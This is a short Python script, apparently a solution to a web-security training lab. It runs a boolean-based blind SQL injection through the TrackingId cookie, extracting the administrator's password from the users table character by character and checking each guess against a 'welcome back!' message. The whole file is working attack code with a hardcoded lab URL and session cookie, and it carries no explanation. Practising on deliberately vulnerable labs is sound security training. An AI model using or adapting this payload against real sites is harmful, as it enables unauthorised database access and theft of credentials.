#!/usr/bin/python3

import requests

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_+()#.-'

URL = "https://0a96000004c4dc5080283a8a001300e8.web-security-academy.net/"
INJECT = "ARrw8QoijoB3h8x6' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1)='{character}'-- a"
flag = ''
for i in range(1,21):
    for c in characters:
        print("Vi tri: ",i, "Ky tu: ", c, end='\r')
        payload = {'TrackingId':INJECT.format(character=c,index=i),'session':'RYznuHrp9r80U3eIIaFd9HAHCfLBW2Gr'}
        r = requests.get(URL, cookies=payload)
        if "welcome back!" in r.text.lower():
            flag += c
            break
    print("FLAG: ", flag)